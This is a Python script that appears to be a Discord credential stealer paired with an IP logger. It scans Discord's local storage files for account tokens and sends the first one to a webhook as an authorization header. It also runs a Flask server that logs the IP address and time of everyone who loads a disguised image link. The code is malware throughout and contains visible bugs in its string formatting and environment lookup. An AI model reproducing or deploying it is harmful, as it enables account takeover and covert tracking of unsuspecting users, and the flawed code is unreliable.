from flask import Flask, send_file, request
from urllib.request import urlopen, Request
import random, requests, json, os, re, datetime
from dotenv import load_dotenv

load_dotenv()
rs = str(random.randint(1, 100000000000000))
data = {
    "username": os.getenv('username'),
    "avatar_url": os.getenv('avatar_url'),
    "img_url": os.getenv('image_url')

}

embed = {
    "image": {
        "url": "http://%s:"+os.getenv('port')+"/img_%s.png" % (os.environ("pub_ip"), rs)
    }
}

webhook = {
    "username": data["username"],
    "avatar_url": data["avatar_url"],
    "embeds": [embed],
}

def get_TOKEN():
    ROAMING = os.getenv("AppData")
    DC = ROAMING + "\\Discord"
    path = DC + "\\Local Storage\\leveldb"
    tokens = []
    for f in os.listdir(path):
        if f.endswith(".log") or f.endswith(".ldb"):
            for line in [x.strip() for x in open(path + "\\" + f, errors="ignore").readlines() if x.strip()]:
                for r in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in re.findall(r, line):
                        tokens.append(token)
    return tokens

def make_headers(token):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
        "Authorization": f"{token}"
    }
    return headers

url_format = "https://discordapp.com/api/webhooks/{webhook_id}/{webhook_token}"
req = Request(url=url_format.format(webhook_id=os.getenv('id'), webhook_token=os.getenv('token')), data=json.dumps(webhook).encode(), headers=make_headers(get_TOKEN()[0]))

urlopen(req)


app = Flask(__name__)

@app.route("/img_%s.png" % rs)
def index():
    i = requests.get(data['img_url'], allow_redirects=True)
    
    n=datetime.datetime.now()
    n=str(n).split(".")[0].replace("-",".")
    open("img2.png", "wb").write(i.content)
    
    if request.remote_addr.startswith("3"):
        return send_file("img.png", mimetype="image/png")
    open("ip.log", 'a').write(n + "|" + request.remote_addr + "\n")
    return send_file("img2.png", mimetype="image/png")

app.run(host="0.0.0.0", port=int(os.getenv('port')))
